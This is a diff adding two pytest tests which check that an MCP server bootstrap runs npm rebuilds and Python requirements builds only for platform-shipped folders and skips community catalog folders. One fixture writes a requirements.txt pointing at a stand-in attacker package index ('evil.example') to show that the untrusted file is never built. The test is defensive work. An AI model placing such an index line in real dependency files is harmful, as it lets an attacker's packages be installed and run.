@@ -504,3 +504,45 @@ class TestSuccessMarkerStaleness:
         from services.mcp.mcp_venv_bootstrap import _venv_is_stale
         _, req, venv, _ = self._mcp(tmp_path, with_pkg=False)
         assert _venv_is_stale(req, venv) is False
+
+
+@pytest.mark.asyncio
+async def test_node_addon_rebuild_runs_for_platform_shipped_folders_only(fake_mcps_root, monkeypatch):
+    """``npm rebuild`` runs a package's lifecycle scripts, which the
+    install refuses; only the folders shipped with the platform get it."""
+    for cat in ("custom", "community"):
+        d = _make_mcp(fake_mcps_root, cat, f"node-{cat}",
+                      {"name": f"node-{cat}", "server": {"runtime": "node"}})
+        (d / "node_modules").mkdir()
+    rebuilt: list[str] = []
+
+    async def _rebuild(mcp_dir, name):
+        rebuilt.append(mcp_dir.parent.name)
+        return "ok-node-rebuild"
+
+    monkeypatch.setattr(mcp_venv_bootstrap, "_reconcile_node_addons", _rebuild)
+    results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
+    assert rebuilt == ["custom"]
+    assert results["node-custom"] == "ok-node-rebuild"
+    assert results["node-community"] == "skipped-bundled-node"
+
+
+@pytest.mark.asyncio
+async def test_python_requirements_build_runs_for_platform_shipped_folders_only(fake_mcps_root):
+    """A catalog Python MCP installs from its ``server.source`` wheels only;
+    a ``requirements.txt`` in its folder is never built at boot (it would run
+    an index, VCS or sdist line of the catalog's choosing as the proxy)."""
+    for cat in ("custom", "community"):
+        d = _make_mcp(fake_mcps_root, cat, f"py-{cat}",
+                      {"name": f"py-{cat}", "server": {"runtime": "python"}})
+        (d / "requirements.txt").write_text("--extra-index-url https://evil.example\nx\n")
+        _write_pyvenv(d / "venv", sys.version_info[0], sys.version_info[1] - 1)
+    with patch("services.mcp.mcp_venv_bootstrap._uv_venv_pinned", new_callable=AsyncMock), \
+         patch("services.mcp.mcp_installer.install_mcp", new_callable=AsyncMock,
+               return_value=InstallResult(ok=True, log="ok", version_hash="h")) as inst:
+        results = await mcp_venv_bootstrap.ensure_bundled_venvs_at_startup()
+    assert [c.args[0].parent.name for c in inst.await_args_list] == ["custom"]
+    assert results["py-custom"] in ("ok", "ok-py-reconcile")
+    assert results["py-community"] == "skipped-community-python"
+    # the community venv is left exactly as it was
+    assert (fake_mcps_root / "community" / "py-community" / "venv" / "pyvenv.cfg").is_file()
